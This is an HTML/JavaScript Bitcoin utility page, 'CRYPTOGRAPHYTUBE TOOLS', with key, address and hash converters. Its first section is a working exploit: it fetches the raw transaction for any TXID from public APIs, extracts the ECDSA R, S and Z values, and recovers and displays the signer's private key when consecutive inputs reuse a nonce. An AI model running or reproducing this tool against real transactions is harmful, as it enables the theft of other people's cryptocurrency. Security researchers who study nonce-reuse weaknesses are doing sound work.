<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>CRYPTOGRAPHYTUBE TOOLS</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/elliptic/6.5.5/elliptic.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">

<style>
/* --- Bitcoin Inspired Theme --- */
:root {
    --bitcoin-orange: #ff9900;
    --dark-bg: #1e1e1e;
    --card-bg: #2d2d30;
    --text-color: #f0f0f0;
    --highlight-green: #00cc00;
}

body { 
    font-family: 'Arial', sans-serif; 
    padding: 20px; 
    max-width: 800px; 
    margin: auto; 
    background-color: var(--dark-bg); 
    color: var(--text-color);
}
input, button, textarea { 
    width: 100%; 
    padding: 12px; 
    margin-top: 10px; 
    border: 1px solid #444; 
    border-radius: 6px; 
    box-sizing: border-box;
    background-color: #3e3e3e;
    color: var(--text-color);
}
button { 
    background-color: var(--bitcoin-orange); 
    color: #1e1e1e; 
    font-weight: bold;
    cursor: pointer; 
    border: none; 
    transition: background-color 0.3s; 
}
button:hover { background-color: #ffa520; }
pre { 
    background: #111; 
    color: var(--highlight-green); 
    padding: 15px; 
    overflow: auto; 
    white-space: pre-wrap; 
    word-wrap: break-word; 
    border-radius: 6px; 
    font-size: 14px; 
    border: 1px solid #444;
}
.section { 
    margin-top: 35px; 
    padding: 20px; 
    border: 1px solid #444; 
    border-radius: 8px; 
    background-color: var(--card-bg); 
    box-shadow: 0 4px 8px rgba(0,0,0,0.5); 
}
.private-key { color: #ff5555; font-weight: bold; }
h2 { 
    color: var(--bitcoin-orange); 
    border-bottom: 2px solid var(--bitcoin-orange); 
    padding-bottom: 10px; 
    text-align: center;
}
h3 { color: var(--text-color); margin-top: 0; }
.header-links { 
    text-align: center; 
    margin-bottom: 25px; 
    display: flex; 
    justify-content: center;
}
.header-links a { 
    margin: 0 15px; 
    color: var(--text-color); 
    font-size: 24px; 
    text-decoration: none;
    transition: color 0.3s;
}
.header-links a:hover { color: var(--bitcoin-orange); }
.header-links .fa-github { color: #fff; }
.header-links .fa-telegram { color: #0088cc; }
.attribution { display: none; }

/* Result Header Styling START */
.result-header {
    border-bottom: 2px dashed #444;
    padding-bottom: 8px;
    margin-bottom: 12px;
    color: var(--bitcoin-orange);
    font-weight: bold;
}
.result-header .author {
    color: var(--text-color);
    font-size: 0.9em;
    display: block;
    margin-top: 4px;
}
/* Result Header Styling END */

</style>
</head>
<body>

<h2>CRYPTOGRAPHYTUBE TOOLS</h2>
<div class="header-links">
    <a href="https://github.com/Cryptographytube" target="_blank" title="GitHub"><i class="fab fa-github"></i> GitHub</a>
    <a href="https://t.me/cryptographytubeofficial" target="_blank" title="Telegram Channel"><i class="fab fa-telegram"></i> Channel</a>
    <a href="https://t.me/cryptographytube" target="_blank" title="Telegram Group"><i class="fab fa-telegram"></i> Group</a>
</div>

<div class="section">
<h3>1. TXID → R, S, Z, Address + Private Key Recovery (R-Reuse)</h3>
<input id="txid_input" placeholder="Enter Bitcoin Transaction ID (TXID)">
<button onclick="processTxid()">Analyze Transaction (R-S-Z)</button>
<pre id="out_txid">
Instructions:
1. Enter a TXID.
2. If two consecutive inputs share the same R-Value (R-reuse), the Private Key will be recovered.
3. Internet connection is required for API access.
</pre>
</div>

---

<div class="section">
<h3>2. Address → HASH160 / Witness Program</h3>
<input id="addr2" placeholder="Enter Bitcoin Address (P2PKH: 1..., P2SH: 3..., Bech32: bc1q...)">
<button onclick="addrToHash()">Convert to Hash160</button>
<pre id="out_hash">
</pre>
</div>

---

<div class="section">
<h3>3. Public Key → X and Y Coordinates</h3>
<input id="pk_coords" placeholder="Enter Compressed (66 hex) or Uncompressed (130 hex) Public Key">
<button onclick="pubToCoords()">Extract Coordinates</button>
<pre id="out_pk_coords">
</pre>
</div>

---

<div class="section">
<h3>4. Public Key → Address (Compressed & Uncompressed)</h3>
<input id="pk" placeholder="Enter Public Key Hex">
<button onclick="pubToAddr()">Convert to Address</button>
<pre id="out_pk">
</pre>
</div>

---

<div class="section">
<h3>5. Private Key → Public Key / Address</h3>
<input id="priv" placeholder="Enter WIF or 64 Hex Private Key">
<button onclick="privToPub()">Convert</button>
<pre id="out_priv">
</pre>
</div>

---

<div class="section">
<h3>6. Address → Public Key (API Lookup)</h3>
<input id="addr" placeholder="Enter Bitcoin Address (P2PKH: 1...)">
<button onclick="findPublicKey()">Find Public Key</button>
<pre id="out_addr">
Note: Public Key is only available for P2PKH addresses that have been spent from (API lookup required).
</pre>
</div>

---

<div class="section">
<h3>7. HASH160 (RIPEMD160) → Address (P2PKH & P2SH)</h3>
<input id="rmd160_input" placeholder="Enter 40-character RIPEMD160 Hash (HASH160)">
<button onclick="rmdToAddress()">Convert to Addresses</button>
<pre id="out_rmd160">
</pre>
</div>

---

<div class="section">
<h3>8. WIF Key → Hex Private Key + Addresses (All Details)</h3>
<input id="wif_to_hex_input" placeholder="Enter Compressed (K/L...) or Uncompressed (5...) WIF Private Key">
<button onclick="wifToHexDetails()">Convert WIF</button>
<pre id="out_wif_to_hex">
</pre>
</div>

---

<div class="section">
<h3>9. Hex Private Key → WIF Key + Addresses (All Details)</h3>
<input id="hex_to_wif_input" placeholder="Enter 64-character Hex Private Key">
<button onclick="hexToWifDetails()">Convert Hex</button>
<pre id="out_hex_to_wif">
</pre>
</div>

<script>
// =================================================================
// 0. CORE UTILITIES AND CONSTANTS
// =================================================================
const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const BASE = BigInt(58);
const BECH32_ALPHABET = 'qpzry9x8gf2tvdsigunpkfclmjwh';
const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');

// Function to generate the custom output header
function getOutputHeader() {
    return `<div class="result-header">CRYPTOGRAPHYTUBE<span class="author">AUTHOR: Sisujhon</span></div>\n`;
}

// Hashing Functions
function sha256hex(hex){ return CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString(); }
function ripe160hex(hex){ return CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(hex)).toString(); }
function dblsha256(hex){ return sha256hex(sha256hex(hex)); }

// Converters
function hexToBytes(hex) {
    if (hex.length % 2 !== 0) hex = '0' + hex;
    return new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
}
function bytesToHex(bytes) {
    return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}
function hexToBigInt(hex) { return BigInt('0x' + hex); }

// Math
function modInverse(a, m) {
    let m0 = m;
    let x0 = 0n;
    let x1 = 1n;
    a %= m;

    while (a > 1n) {
        let q = a / m;
        let t = m;

        m = a % m;
        a = t;

        t = x0;
        x0 = x1 - q * x0;
        x1 = t;
    }

    if (x1 < 0n) {
        x1 += m0;
    }
    return x1;
}

function reverseHex(hex) {
    if (hex.length % 2 !== 0) throw new Error("Hex string length is odd.");
    return hex.match(/.{1,2}/g).reverse().join('');
}

// =================================================================
// 1. BASE58 UTILITIES (P2PKH, P2SH, WIF)
// =================================================================
function b58decode(str){
    let num = BigInt(0);
    for(const char of str){ num = num * BASE + BigInt(ALPHABET.indexOf(char)); }
    let hex = num.toString(16);
    
    let leadingOnes = 0;
    for(let i = 0; i < str.length && str[i] === '1'; i++){ leadingOnes++; }
    let leadingZeros = "00".repeat(leadingOnes);
    
    let totalLength = leadingZeros.length + hex.length;
    if (totalLength % 2 !== 0 && str.length > 0) {
        hex = "0" + hex;
    }

    return leadingZeros + hex;
}

function b58encode(hex){
    let num = BigInt("0x"+hex);
    let str = "";
    while(num > 0){
        const r = Number(num % 58n);
        str = ALPHABET[r] + str;
        num /= 58n;
    }
    let leadingZeros = "";
    for(let i=0; i<hex.length; i+=2){
        if(hex.substring(i, i+2) === "00"){
            leadingZeros += "1";
        } else {
            break;
        }
    }
    return leadingZeros + str;
}

function b58_decode_check(encoded) {
    const hex = b58decode(encoded);
    const data_and_checksum = hexToBytes(hex);
    
    if (data_and_checksum.length < 4) throw new Error('Decoded length is too short for checksum check.');

    const data = data_and_checksum.slice(0, data_and_checksum.length - 4);
    const checksum = data_and_checksum.slice(data_and_checksum.length - 4);

    const dataHex = bytesToHex(data);
    const hash = dblsha256(dataHex);
    const calculatedChecksum = hash.substring(0, 8);
    
    if (bytesToHex(checksum) !== calculatedChecksum) {
        throw new Error('Checksum mismatch.');
    }
    
    return data;
}

// =================================================================
// 2. ADDRESS/KEY GENERATION UTILITIES
// =================================================================
function hash160ToAddress(hash160, version_byte) {
    const versioned_hash = version_byte + hash160;
    const checksum = dblsha256(versioned_hash).substring(0, 8);
    return b58encode(versioned_hash + checksum);
}

function pubToAddr_P2PKH(pub_hex) {
    const pub_bin = hexToBytes(pub_hex);
    const sha256_hash = sha256hex(bytesToHex(pub_bin));
    const ripemd160_hash = ripe160hex(sha256_hash);
    
    // P2PKH uses version byte 00
    return hash160ToAddress(ripemd160_hash, "00");
}

function privHexToWIF(hex, compressed) {
    const versioned_hex = "80" + hex;
    let wif_data = versioned_hex;

    if (compressed) {
        wif_data += "01"; // Compressed flag
    }
    
    const checksum = dblsha256(wif_data).substring(0, 8);
    return b58encode(wif_data + checksum);
}

// =================================================================
// 3. MAIN CONVERSION FUNCTIONS (USED BY OPTIONS 5, 8, 9)
// =================================================================

function getFullKeyDetails(privateKeyHex) {
    const ec = new elliptic.ec("secp256k1");
    const kp = ec.keyFromPrivate(privateKeyHex);
    const pub = kp.getPublic();

    const compressedPub = pub.encode('hex', true);
    const addressComp = pubToAddr_P2PKH(compressedPub);
    const wifCompressed = privHexToWIF(privateKeyHex, true);
    
    const uncompressedPub = pub.encode('hex', false);
    const addressUncomp = pubToAddr_P2PKH(uncompressedPub);
    const wifUncompressed = privHexToWIF(privateKeyHex, false);
    
    return {
        hex: privateKeyHex,
        compressedPub,
        uncompressedPub,
        addressComp,
        addressUncomp,
        wifCompressed,
        wifUncompressed
    };
}


/* ---------------------- 5. PrivateKey (WIF or Hex) → PublicKey ---------------------- */
function privToPub(){
    const out = document.getElementById("out_priv");
    out.innerHTML = '';
    
    try{
        let key = document.getElementById("priv").value.trim();
        let hex;
        
        if(key.length === 64){
            hex = key;
        } else {
            const decodedBytes = b58_decode_check(key);
            if (decodedBytes[0] !== 0x80) throw new Error("Not a Bitcoin Mainnet Private Key (Version 80).");
            const decodedHex = bytesToHex(decodedBytes);
            
            if (decodedHex.length === 66) { 
                hex = decodedHex.substring(2);
            } else if (decodedHex.length === 68 && decodedHex.endsWith('01')) { 
                hex = decodedHex.substring(2, 66);
            } else {
                 throw new Error("Invalid WIF structure or length.");
            }
        }
        
        const details = getFullKeyDetails(hex);

        let content =
            "Private Key (Hex): " + details.hex + "\n\n" +
            "--- COMPRESSED KEY INFO ---\n" +
            "1. Public Key (Compressed): " + details.compressedPub + "\n" +
            "2. P2PKH Address: " + details.addressComp + " (Standard)\n" +
            "3. WIF (Compressed): " + details.wifCompressed + " (K/L...)\n\n" +
            "--- UNCOMPRESSED KEY INFO ---\n" +
            "4. Public Key (Uncompressed): " + details.uncompressedPub + "\n" +
            "5. P2PKH Address: " + details.addressUncomp + " (Legacy)\n" +
            "6. WIF (Uncompressed): " + details.wifUncompressed + " (5...)";

        out.innerHTML = getOutputHeader() + content; // Added Header

    } catch(e){ 
        out.innerHTML = `Error: Invalid Private Key format or checksum. ${e.message}.`;
    }
}

/* ---------------------- 8. WIF Key → Hex Private Key (FIXED) ---------------------- */
function wifToHexDetails() {
    const wif = document.getElementById("wif_to_hex_input").value.trim();
    const out = document.getElementById("out_wif_to_hex");
    out.innerHTML = '';

    try {
        const decodedBytes = b58_decode_check(wif);
        if (decodedBytes[0] !== 0x80) throw new Error("Not a Bitcoin Mainnet Private Key (Version 80).");
        
        const decodedHex = bytesToHex(decodedBytes);
        let hex;
        let compressionFlag = "No Flag (Uncompressed)";
        
        if (decodedHex.length === 66) { 
            hex = decodedHex.substring(2);
        } else if (decodedHex.length === 68 && decodedHex.endsWith('01')) { 
            hex = decodedHex.substring(2, 66);
            compressionFlag = "01 (Compressed)";
        } else {
             throw new Error("Invalid WIF structure or length.");
        }
        
        const details = getFullKeyDetails(hex);

        let content =
            "Input WIF Key: " + wif + "\n" +
            "WIF Type Flag: " + compressionFlag + "\n\n" +
            "--- HEX PRIVATE KEY ---\n" +
            "Hex Private Key (d): " + details.hex + "\n\n" +
            "--- ADDRESSES & PUBLIC KEYS ---\n" +
            "1. Public Key (Compressed): " + details.compressedPub + "\n" +
            "2. P2PKH Address (Compressed Hash): " + details.addressComp + " (Standard)\n\n" +
            "3. Public Key (Uncompressed): " + details.uncompressedPub + "\n" +
            "4. P2PKH Address (Uncompressed Hash): " + details.addressUncomp + " (Legacy)";

        out.innerHTML = getOutputHeader() + content; // Added Header

    } catch(e) {
        out.innerHTML = `<span class='private-key'>Error: Invalid WIF Key or Checksum mismatch. ${e.message}</span>`;
    }
}

/* ---------------------- 9. Hex Private Key → WIF Key (NEW) ---------------------- */
function hexToWifDetails() {
    const hex = document.getElementById("hex_to_wif_input").value.trim().toLowerCase();
    const out = document.getElementById("out_hex_to_wif");
    out.innerHTML = '';

    if (hex.length !== 64 || !/^[0-9a-f]{64}$/.test(hex)) {
        out.innerHTML = `<span class='private-key'>Error: Invalid Hex Private Key. Must be a 64-character hexadecimal string.</span>`;
        return;
    }

    try {
        const details = getFullKeyDetails(hex);

        let content =
            "Input Hex Private Key (d): " + details.hex + "\n\n" +
            "--- COMPRESSED WIF KEY INFO ---\n" +
            "1. WIF Key (Compressed): " + details.wifCompressed + " (K/L...)\n" +
            "2. Public Key: " + details.compressedPub + "\n" +
            "3. P2PKH Address: " + details.addressComp + " (Standard)\n\n" +
            "--- UNCOMPRESSED WIF KEY INFO ---\n" +
            "4. WIF Key (Uncompressed): " + details.wifUncompressed + " (5...)\n" +
            "5. Public Key: " + details.uncompressedPub + "\n" +
            "6. P2PKH Address: " + details.addressUncomp + " (Legacy)";

        out.innerHTML = getOutputHeader() + content; // Added Header

    } catch(e) {
        out.innerHTML = "Error during conversion: " + (e.message || "An unexpected error occurred.");
    }
}

// =================================================================
// 4. PREVIOUS OPTIONS (1-7)
// =================================================================

// --- Bech32 Utility ---
function convertbits(data, frombits, tobits, pad) {
    let acc = 0;
    let bits = 0;
    const ret = [];
    const maxv = (1 << tobits) - 1;

    for (const value of data) {
        if (value < 0 || value >> frombits !== 0) return null;
        acc = (acc << frombits) | value;
        bits += frombits;
        while (bits >= tobits) {
            bits -= tobits;
            ret.push((acc >> bits) & maxv);
        }
    }
    if (pad) {
        if (bits > 0) {
            ret.push((acc << (tobits - bits)) & maxv);
        }
    } else if (bits >= frombits || ((acc << (tobits - bits)) & maxv)) {
        return null;
    }
    return ret;
}

function bech32_decode_program(address) {
    const lower = address.toLowerCase();
    const separator = lower.lastIndexOf('1');
    const data = lower.substring(separator + 1);

    const data_words = [];
    for (const char of data) {
        const index = BECH32_ALPHABET.indexOf(char);
        if (index === -1) throw new Error('Invalid Bech32 character');
        data_words.push(index);
    }
    
    if (data_words.length < 6) throw new Error('Invalid Bech32 data length');
    
    const data_payload = data_words.slice(0, data_words.length - 6);
    const program_bytes = convertbits(data_payload, 5, 8, false);

    if (program_bytes === null || program_bytes.length < 1) {
        throw new Error('Invalid Bech32 data conversion');
    }

    const version = program_bytes[0];
    const program = new Uint8Array(program_bytes.slice(1));

    return { version, program };
}
// --- End Bech32 Utility ---


/* ---------------------- 1. TXID → R-S-Z + Recovery ---------------------- */
async function getRawTx(txid) {
    const url_big_endian = `https://blockchain.info/rawtx/${txid}?format=hex`;
    const reversed_txid = reverseHex(txid);
    const url_little_endian = `https://blockstream.info/api/tx/${reversed_txid}/hex`;
    
    let rawtx = null;

    try {
        const response = await fetch(url_big_endian, { signal: AbortSignal.timeout(10000) });
        if (response.ok) {
            rawtx = await response.text();
            if (rawtx.length > 100 && !rawtx.includes("Transaction not found")) return rawtx.trim();
        }
    } catch (e) {}

    try {
        const response = await fetch(url_little_endian, { signal: AbortSignal.timeout(10000) });
        if (response.ok) {
            rawtx = await response.text();
            if (rawtx.length > 100 && !rawtx.includes("Transaction not found")) return rawtx.trim();
        }
    } catch (e) {}

    if (!rawtx || rawtx.length < 100) {
        throw new Error("Could not fetch raw transaction data from multiple sources.");
    }

    return rawtx;
}

function getRS(sig) {
    let r_len = parseInt(sig.substring(2, 4), 16);
    let r = sig.substring(4, 4 + r_len * 2);
    let s_start_index = 8 + r_len * 2;
    let s = sig.substring(s_start_index);
    return { r, s };
}

function parseScriptSig(scr) {
    let sigL = parseInt(scr.substring(2, 4), 16);
    let sigs = scr.substring(2 + 2, 2 + sigL * 2);
    
    const { r, s } = getRS(sigs.substring(4)); 

    let pubL_start = 4 + sigL * 2;
    let pub = scr.substring(pubL_start + 2);
    
    if (pub.length !== 66 && pub.length !== 130) {
        throw new Error("Invalid Public Key length in scriptSig.");
    }
    
    return { r, s, pub };
}

function parsingRaw(txRaw) {
    let inputLst = [];
    
    if (txRaw.substring(8, 12) === '0001') {
        throw new Error("Witness data found. Only Legacy P2PKH transactions are supported for R-Reuse analysis.");
    }

    const inputNo = parseInt(txRaw.substring(8, 10), 16);
    let cur = 10;
    
    for (let g = 0; g < inputNo; g++) {
        const pre_out = txRaw.substring(cur, cur + 64);
        const var0 = txRaw.substring(cur + 64, cur + 64 + 8); 
        cur += 64 + 8;
        
        const scrL = parseInt(txRaw.substring(cur, cur + 2), 16);
        const scr = txRaw.substring(cur, 2 + cur + 2 * scrL); 
        
        const { r, s, pub } = parseScriptSig(scr);

        const seq_start = 2 + cur + 2 * scrL;
        const seq = txRaw.substring(seq_start, seq_start + 8); 
        
        inputLst.push({ pre_out, var0, r, s, pub, seq });
        cur = seq_start + 8;
    }
    const hsl = txRaw.substring(cur); 
    
    return { no1: txRaw.substring(0, 10), inputLst, hsl };
}


function getrsz(pars) {
    const result = [];
    const { no1, inputLst, hsl } = pars;
    const tot = inputLst.length;
    
    for (let x = 0; x < tot; x++) {
        let e = no1; 
        for (let i = 0; i < tot; i++) {
            const input = inputLst[i];
            e += input.pre_out;
            e += input.var0;
            
            if (x === i) {
                const hash160 = ripe160hex(sha256hex(input.pub));
                e += '1976a914' + hash160 + '88ac';
            } else {
                e += '00';
            }
            e += input.seq;
        }
        e += hsl + "01000000";

        const z_hex = dblsha256(e); 
        const addr = pubToAddr_P2PKH(inputLst[x].pub);
        
        result.push({ r: inputLst[x].r, s: inputLst[x].s, z: z_hex, pub: inputLst[x].pub, raw_signing_data: e, addr: addr, input_index: x });
    }
    return result;
}

function recover_private_key(R, S1, S2, Z1, Z2) {
    try {
        const R_inv = modInverse(R, N);
        
        const S_diff = (S1 - S2 + N) % N; 
        const S_diff_inv = modInverse(S_diff, N);
        const Z_diff = (Z1 - Z2 + N) % N; 
        const k = (Z_diff * S_diff_inv) % N; 

        const S1k = (S1 * k) % N;
        const S1k_Z1 = (S1k - Z1 + N) % N; 
        const d = (S1k_Z1 * R_inv) % N;

        return d.toString(16).padStart(64, '0');
    } catch (e) {
        return "ERROR: Could not perform modular inverse.";
    }
}


async function processTxid() {
    const txid = document.getElementById("txid_input").value.trim();
    const out = document.getElementById("out_txid");
    
    out.innerHTML = "Fetching raw transaction data (Trying multiple APIs)...";
    
    if (txid.length !== 64) {
        out.innerHTML = `<span class='private-key'>Error: Invalid TXID length. Must be 64 hex characters.</span>`;
        return;
    }
    
    let rawtx;
    try {
        rawtx = await getRawTx(txid);
        out.innerHTML = `Raw data fetched. Parsing inputs and calculating Z values...`;
    } catch (e) {
        out.innerHTML = `<span class='private-key'>Error fetching raw TX: ${e.message}. Check network connection or TXID.</span>`;
        return;
    }

    let parsed_data;
    try {
        parsed_data = parsingRaw(rawtx);
    } catch (e) {
        out.innerHTML = `<span class='private-key'>Error parsing raw TX: ${e.message}</span>`;
        return;
    }

    const rsz_results = getrsz(parsed_data);
    
    let output_html = getOutputHeader() + "<h3>Transaction Analysis Results</h3>"; // Added Header
    let private_key_found = false;
    let found_r_reuse = false;
    
    for (let i = 0; i < rsz_results.length; i++) {
        const current = rsz_results[i];
        
        output_html += `
        <p><strong>[+] Input No: ${current.input_index}</strong></p>
        <pre>  Address: ${current.addr}
  R: ${current.r}
  S: ${current.s}
  Z (Hash): ${current.z}</pre>`;

        if (i > 0) {
            const previous = rsz_results[i - 1];
            if (current.r === previous.r) {
                found_r_reuse = true;
                output_html += `<p class="private-key">!!! R REUSE DETECTED BETWEEN INPUT ${i-1} AND ${i} !!!</p>`;
                
                const private_key = recover_private_key(
                    hexToBigInt(current.r),
                    hexToBigInt(previous.s),
                    hexToBigInt(current.s),
                    hexToBigInt(previous.z),
                    hexToBigInt(current.z)
                );
                
                if (private_key.startsWith("ERROR")) {
                     output_html += `<p class="private-key">Private Key: ERROR RECOVERING KEY. ${private_key}</p>`;
                } else {
                    output_html += `<p class="private-key">Private Key Found: ${private_key}</p>`;
                    private_key_found = true;
                }
            }
        }
    }
    
    if (!found_r_reuse) {
        output_html += "<p><strong>[+] No matching R values found between consecutive inputs. Private Key: Not Found</strong></p>";
    } else if (private_key_found) {
        output_html += "<p class='private-key'>!!! PRIVATE KEY RECOVERY SUCCESSFUL !!!</p>";
    }

    out.innerHTML = output_html;
}


/* ---------------------- 2. Address → HASH160/Witness Program ---------------------- */
function addrToHash(){
    const a = document.getElementById("addr2").value.trim();
    const out = document.getElementById("out_hash");
    out.innerHTML = '';
    
    try {
        let content = '';
        if (a.startsWith('1') || a.startsWith('3')) {
            const decodedBytes = b58_decode_check(a); 
            const versionByte = decodedBytes[0];
            
            if (decodedBytes.length !== 21) throw new Error('Invalid Base58 decoded length.');

            const hash160_hex = bytesToHex(decodedBytes.slice(1));
            
            content = 
                "Address Type: Base58Check\n" +
                "Version Byte: " + bytesToHex(new Uint8Array([versionByte])) + 
                " (" + (versionByte === 0 ? "P2PKH: 1..." : "P2SH: 3...") + ")\n" +
                "HASH160 (RIPEMD160): " + hash160_hex;

        } else if (a.startsWith('bc1q') || a.startsWith('tb1q') || a.startsWith('bc1p') || a.startsWith('tb1p')) {
            const decoded = bech32_decode_program(a);
            const program_hash = bytesToHex(decoded.program);
            
            content = 
                "Address Type: Bech32/Bech32m\n" +
                "Witness Version: " + decoded.version + 
                " (" + (decoded.version === 0 ? "SegWit" : "Taproot/Future") + ")\n" +
                "Witness Program (HASH): " + program_hash;
                
        } else {
            content = "Error: Unsupported address format. Must start with 1, 3, or bc1q/tb1q.";
        }
        
        out.innerHTML = getOutputHeader() + content; // Added Header
    } catch(e){ 
        out.innerHTML = "Error: " + (e.message || "Invalid address format or decoding failed.");
    }
}


/* ---------------------- 3. Public Key → X and Y Coordinates ---------------------- */
function pubToCoords(){
    const out = document.getElementById("out_pk_coords");
    out.innerHTML = '';
    
    try{
        let pub = document.getElementById("pk_coords").value.trim();
        if(pub.length !== 66 && pub.length !== 130) {
            out.innerHTML = `Error: Invalid Public Key Length (must be 66 or 130 hex characters).`;
            return;
        }

        const ec = new elliptic.ec("secp256k1");
        const point = ec.keyFromPublic(pub, 'hex').getPublic();
        
        let uncompressedPub = point.encode('hex', false);
        let compressedPub = point.encode('hex', true);

        let x_hex = point.getX().toString("hex").padStart(64,"0");
        let y_hex = point.getY().toString("hex").padStart(64,"0");
        
        let x_dec = BigInt("0x" + x_hex).toString();
        let y_dec = BigInt("0x" + y_hex).toString();

        let content =
            "Input Public Key: " + pub + "\n" +
            "Public Key (Compressed): " + compressedPub + "\n" +
            "Public Key (Uncompressed): " + uncompressedPub + "\n\n" +
            "--- COORDINATES (HEX) ---\n" +
            "X Coordinate: " + x_hex + "\n" +
            "Y Coordinate: " + y_hex + "\n\n" +
            "--- COORDINATES (DECIMAL) ---\n" +
            "X Coordinate (DECIMAL): " + x_dec + "\n" +
            "Y Coordinate (DECIMAL): " + y_dec;
            
        out.innerHTML = getOutputHeader() + content; // Added Header

    } catch(e){ 
        out.innerHTML = "Error: Invalid Public Key Format. Ensure the key is valid.";
    }
}


/* ---------------------- 4. Public Key → Address ---------------------- */
function pubToAddr(){
    const out = document.getElementById("out_pk");
    out.innerHTML = '';
    
    try{
        let pub = document.getElementById("pk").value.trim();
        if(pub.length !== 66 && pub.length !== 130) {
            out.innerHTML = `Error: Invalid Public Key Length (must be 66 or 130 hex characters).`;
            return;
        }

        const ec = new elliptic.ec("secp256k1");
        const point = ec.keyFromPublic(pub, 'hex').getPublic();

        let compressedPub = point.encode('hex', true);
        let address_comp = pubToAddr_P2PKH(compressedPub);
        
        let uncompressedPub = point.encode('hex', false);
        let address_uncomp = pubToAddr_P2PKH(uncompressedPub);

        let content =
            "Input Public Key: " + pub + "\n\n" +
            "1. Public Key (Compressed): " + compressedPub + "\n" +
            "2. P2PKH Address (Compressed Key Hash): " + address_comp + " (Standard)\n\n" +
            "3. Public Key (Uncompressed): " + uncompressedPub + "\n" +
            "4. P2PKH Address (Uncompressed Key Hash): " + address_uncomp + " (Legacy)";
            
        out.innerHTML = getOutputHeader() + content; // Added Header

    } catch(e){ 
        out.innerHTML = "Error: Invalid Public Key Format or Library Issue.";
    }
}


/* ---------------------- 6. Address → Public Key (API Lookup) ---------------------- */
async function apiTry(url){
    try{
        let r = await fetch(url, { signal: AbortSignal.timeout(10000) });
        if(!r.ok) return null; 
        return await r.text(); 
    } catch {
        return null;
    }
}

async function findPublicKey(){
    let addr = document.getElementById("addr").value.trim();
    const out = document.getElementById("out_addr");
    out.innerHTML = `Checking for Public Key via API (Blockchain.info)...`;
    
    if (!addr.startsWith('1')) {
        out.innerHTML = `Error: Public Key lookup via API usually only works for P2PKH (starts with 1) addresses.`;
        return;
    }
    
    let url_direct = `https://blockchain.info/q/pubkeyaddr/${addr}`;
    let pubkey_response = await apiTry(url_direct);

    if (pubkey_response){
        if (pubkey_response.length >= 66 && (pubkey_response.startsWith("02") || pubkey_response.startsWith("03") || pubkey_response.startsWith("04"))){
            let content = getOutputHeader() + "✅ Public Key Found (via Blockchain.info):\n" + pubkey_response; // Added Header
            out.innerHTML = content;
             return;
        } else if (pubkey_response.includes("No public key for this address")) {
             out.innerHTML = "❌ Public Key not found in Blockchain.info's index. (Perhaps no transactions yet or address type unsupported)";
             return;
        }
    }
    
    out.innerHTML = "❌ Public Key not found via API. The Public Key must have been exposed (e.g., when the coins were spent) for this tool to find it.";
}


/* ---------------------- 7. RMD160 (HASH160) → ADDRESS LOGIC ---------------------- */
function rmdToAddress() {
    const hash160 = document.getElementById("rmd160_input").value.trim().toLowerCase();
    const out = document.getElementById("out_rmd160");
    out.innerHTML = '';

    if (hash160.length !== 40 || !/^[0-9a-f]{40}$/.test(hash160)) {
        out.innerHTML = `<span class='private-key'>Error: Invalid HASH160. Must be a 40-character hexadecimal string.</span>`;
        return;
    }

    try {
        // P2PKH Address (Starts with '1'): Version Byte 00 (Hex)
        const p2pkh_addr = hash160ToAddress(hash160, "00");

        // P2SH Address (Starts with '3'): Version Byte 05 (Hex)
        const p2sh_addr = hash160ToAddress(hash160, "05");

        let content =
            "Input HASH160: " + hash160 + "\n\n" +
            "1. P2PKH Address (Version 00): " + p2pkh_addr + " (Legacy/Standard)\n" +
            "2. P2SH Address (Version 05): " + p2sh_addr + " (SegWit compatibility)";

        out.innerHTML = getOutputHeader() + content; // Added Header

    } catch(e) {
        out.innerHTML = "Error during conversion: " + (e.message || "An unexpected error occurred.");
    }
}
</script>

</body>
</html>
